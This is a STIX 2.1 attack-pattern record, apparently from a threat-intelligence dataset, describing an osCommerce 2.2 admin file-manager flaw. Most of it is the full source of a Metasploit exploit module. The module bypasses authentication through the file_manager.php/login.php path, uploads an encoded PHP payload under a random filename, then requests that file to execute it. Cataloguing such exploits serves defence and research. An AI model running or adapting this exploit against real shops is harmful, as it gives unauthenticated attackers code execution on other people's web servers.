{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a44985fb-395a-4318-af22-6062702befd2",
    "created": "2024-08-14T17:13:06.864714Z",
    "modified": "2024-08-14T17:13:06.864718Z",
    "name": "osCommerce 2.2 Arbitrary PHP Code Execution",
    "description": " osCommerce is a popular open source E-Commerce application. The admin console contains a file management utility that allows administrators to upload, download, and edit files. This could be abused to allow unauthenticated attackers to execute arbitrary code with the permissions of the webserver. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/oscommerce_filemanager.rb",
            "external_id": "oscommerce_filemanager.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'osCommerce 2.2 Arbitrary PHP Code Execution',\n      'Description'    => %q{\n          osCommerce is a popular open source E-Commerce application.\n        The admin console contains a file management utility that\n        allows administrators to upload, download, and edit files.\n        This could be abused to allow unauthenticated attackers to\n        execute arbitrary code with the permissions of the\n        webserver.\n      },\n      'Author'         => [ 'egypt' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '60018' ],\n          [ 'EDB', '9556' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'Space'       => 4000,\n          # max url length for some old versions of apache according to\n          # http://www.boutell.com/newfaq/misc/urllength.html\n          'DisableNops' => true,\n          #'BadChars'    => %q|'\"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n          # Since our payload is uploaded as a file, it is polite to\n          # clean up after ourselves.\n          'Prepend'     => \"unlink(__FILE__);\",\n          'Keys'        => ['php'],\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-08-31'\n      ))\n\n    register_options(\n      [\n        OptString.new('URI',   [ true,  \"Base osCommerce directory path\", '/catalog/']),\n      ])\n\n  end\n\n  def exploit\n    # Our filename gets run through basename(), so we can have arbitrary\n    # junk in front of slashes and it will get stripped out. The unlink in\n    # Payload => Prepend above ensures that the file is deleted.\n    filename  = rand_text_alphanumeric(rand(5)+5) + \"/\"\n    (rand(5)+5).times do\n      filename << rand_text_alphanumeric(rand(5)+5) + \"/\"\n    end\n    filename << rand_text_alphanumeric(rand(5)+5) + \".php\"\n\n\n    p = rand_text_english(rand(100)+100) + \"<?php \" + payload.encoded + \" ?>\" + rand_text_english(rand(100)+100)\n    p = Rex::Text.uri_encode(p)\n    data = \"filename=#{filename}&file_contents=#{p}\"\n\n    print_status(\"Sending file save request\")\n    response = send_request_raw({\n      'uri'\t  => normalize_uri(datastore['URI'], \"admin/file_manager.php/login.php\") + \"?action=save\",\n      'method'  => 'POST',\n      'data'    => data,\n      'ctype'   => 'application/x-www-form-urlencoded'\n    }, 3)\n\n    # If the upload worked, the server tries to redirect us to some info\n    # about the file we just saved\n    if response and response.code != 302\n      print_error(\"Server returned non-302 status code (#{response.code})\")\n    end\n\n    print_status(\"Requesting our payload\")\n    # very short timeout because the request may never return if we're\n    # sending a socket payload\n    timeout = 0.1\n    response = send_request_raw({\n      # Allow findsock payloads to work\n      'global' => true,\n      'uri' => normalize_uri(datastore['URI'], File.basename(filename))\n    }, timeout)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-08-31",
    "x_mitre_platforms": [
        "['php']"
    ]
}